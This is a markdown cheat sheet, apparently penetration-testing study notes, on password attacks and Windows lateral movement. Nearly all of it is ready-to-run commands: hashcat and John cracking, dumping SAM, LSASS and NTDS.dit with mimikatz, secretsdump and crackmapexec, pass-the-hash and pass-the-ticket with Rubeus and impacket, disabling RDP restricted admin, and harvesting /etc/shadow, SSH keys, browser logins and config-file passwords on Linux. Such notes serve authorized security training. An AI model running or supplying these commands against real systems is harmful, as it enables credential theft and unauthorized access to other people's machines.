# Password Attacks

### Generating Password Mutations

- Followig are the symbols used to create `rules` in hashcat.

```shell
:	    Do nothing.
l	    Lowercase all letters.
u	    Uppercase all letters.
c	    Capitalize the first letter and lowercase others.
sXY	    Replace all instances of X with Y.
$!	    Add the exclamation character at the end.
```

- Command to create wordlist using rules:

```shell
# Rules are available at /usr/share/hashcat/rules/
hashcat --force password.list -r rule --stdout | sort -u > mut_password.list
```

### Cracking Protected Archives

```shell
# Use John to crack protected files
office2john, ssh2john, pdf2john, zip2john, bitlocker2john etc

# Cracking OpenSSL Encrypted Archives
## Using a for-loop to Display Extracted Contents
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in $NAME.gzip -k $i 2>/dev/null| tar xz;done
```

### Generating Wordlists Using CeWL

```shell
cewl website_link -d 4 -m 6 --lowercase -w output_file
```


## Windows Password Attacks

### Attacking SAM

- `hklm\sam` Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
- `hklm\system` Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
- `hklm\security` Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

```shell
# Using reg.exe save to Copy Registry Hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Dumping hashes from the hives
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL

# Cracking hashes
sudo hashcat -m 1000 hashes_file wordlist
```

- Dumping hashes remotely:

```shell
# Dump hashes from the SAM database 
crackmapexec smb $TARGET_IP --local-auth -u $USERNAME -p $PASSWORD --sam

# Extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords
crackmapexec smb $TARGET_IP --local-auth -u $USERNAME -p $PASSWORD --lsa
```

### Attacking LSSAS

```shell
# Get Process ID of lssas
tasklist /svc
Get-Process lsass
Get-Process lsass | Select Id, ProcessName

# Create lssas dump
rundll32 C:\windows\system32\comsvcs.dll, MiniDump $LSSAS_PROCESS_ID C:\lsass.dmp full

# Using pypykatz to dump credentials in linux
pypykatz lsa minidump lsass.dmp 

# Using mimikatz to dump creds from lssas
privilege::debug
sekurlsa::minidump lsass.dmp  # If dump available
sekurlsa::logonpasswords
```

### Attacking NTDS.dit

- From windows host: 

```shell
# Creating copy of ntds.dit using vssadmin
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# Using mimikatz
lsadump::dcsync /domain:$DOMAIN /user:$DOMAIN\$USER
```

- From linux host:

```shell
crackmapexec smb $TARGET_IP  -u $USER -p $PASSWORD --ntds
secretsdump.py -outputfile hashes -just-dc $DOMAIN/$USER@$TARGET_IP 
```

- Enumerating users with reversible encryption enabled:

```shell
# Get list of users
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# Verify if reversible encryption is enabled
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

> Secretsdump.py will save reversible passwords in plain text.

### Credential Hunting

```shell
# Find all credentials in system
start lazagne.exe all

# Configuration files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Windows Lateral Movement

### Pass The Hash (PtH)

- From windows host:

```shell
# Using mimikatz
privilege::debug 
sekurlsa::pth /user:$USERNAME /rc4 or /NTLM:$HASH /domain:$DOMMAIN /run:cmd.exe

# Using Invoke-TheHash
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target $TARGET_IP -Domain $DOMAIN -Username $USERNAME -Hash $HASH -Command $COMMAND -Verbose
```

- From linux host:

```shell
# Checking access on subnet
crackmapexec smb $SUBNET -u $USER -d . -H $HASH

# Getting shell
evil-winrm -i $TARGET_IP -u $USER -H $HASH
impacket-psexec $USER@$TARGET_IP -hashes :$HASH

# Using RDP
## Enable restricted admin mode to allow PtH
cmd > reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

## Getting rdp session
xfreerdp  /v:$TARGET_IP /u:$USER /pth:$HASH
```
> UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to `0`, it means that the built-in local admin account is the only local account allowed to perform remote administration tasks. Setting it to `1` allows the other local admins as well.


### Pass the Key or OverPass the Hash

```shell
# Extracting kerberos keys using mimikatz
privilege::debug
sekurlsa::ekeys
# Over Pass the hash
sekurlsa::pth /user:$USERNAME /rc4 or /NTLM:$HASH /domain:$DOMMAIN /run:cmd.exe
# Rubeus - Pass the Key or OverPass the Hash
Rubeus.exe  asktgt /domain:$DOMAIN /user:$USER /aes256:=$ekeys_aes256_hmac /nowrap
```

### Pass The Ticket (PtT)

- From windows host:

```shell
# Using rubeus
## Create a Sacrificial Process with Rubeus
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
## Perform pass the ticket
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:=$ekeys_aes256_hmac /ptt
Rubeus.exe ptt /ticket:$TICKET_PATH.kribi or $BASE64_TICKET

# Using mimikatz
privilege::debug
kerberos::ptt "$TICKET_PATH.kribi"

# Use PS remoting for lateral movement
Enter-PSSession -ComputerName $COMPUTER_NAME
```

- From linux host:

```shell
# Check If Linux Machine is Domain Joined
realm list
ps -ef | grep -i "winbind\|sssd"

# Finding Keytab Files
find / -name *keytab* -ls 2>/dev/null
ls -la /tmp
# Identifying Keytab Files in Cronjobs
crontab -l
# Reviewing Environment Variables for ccache Files
env | grep -i krb5

# Abusing KeyTab Files
## Listing keytab File Information
klist -k -t $PATH.keytab 
## Impersonating a User with a keytab
kinit $USER@$DOMAIN -k -t $PATH.keytab
## Verify if it is added
klist

# Extracting Keytab Hashes with KeyTabExtract
python3 /opt/keytabextract.py $PATH.keytab
# Switch to user if password cracked
su - $USER@$DOMAIN

# Abusing Keytab ccache
## Find ccache files in system 'krb5cc_'
## Import cache file in the seesion
export KRB5CCNAME=$PATH/krb5cc_
root@linux01:~# klist
```

- Using Linux Attack Tools with Kerberos:

```shell
# Export the ccache file
export KRB5CCNAME=$PATH/krb5cc_

# Using wmiexec
impacket-wmiexec $COMPUTER_NAME -k

# Evil winrm
## sudo apt-get install krb5-user -y
## Check /etc/krb5.conf
evil-winrm -i $COMPUTER_NAME -r $DOMAIN
```

> We can convert ccache files in kribi format to use them in windows: `impacket-ticketConverter krb5cc_ name.kirbi`

- Using linikatz to extract all creds from system

```shell
# wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
# Saves files in a folder name starting with linikatz
./linikatz.sh
```


## Linux Password Attacks

### Credential Hunting

```shell
# Finding configuration files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Finding credentials in configuration files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# finding databases
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# Finding scripts
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

# SSH Keys
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# Bash history
tail -n5 /home/*/.bash*

# Look for logs in /var/log
cd /var/log; ls -al

for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

# Hunting for protected files
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Memory and cache
sudo python3 mimipenguin.py
sudo python2.7 laZagne.py all
python3 laZagne.py browsers

# Credentials in firefox
ls -l .mozilla/firefox/ | grep default 
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
python3.9 firefox_decrypt.py
```

### Reading important files

- Reading important credential files in linux:

```shell
# Shadow file
sudo cat /etc/shadow

# Opasswd file for old passwords
sudo cat /etc/security/opasswd
```

- Cracking credentials in shadow file

```shell
# Create copies of files
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 

# Unshadow the shadow file
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Crack the hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```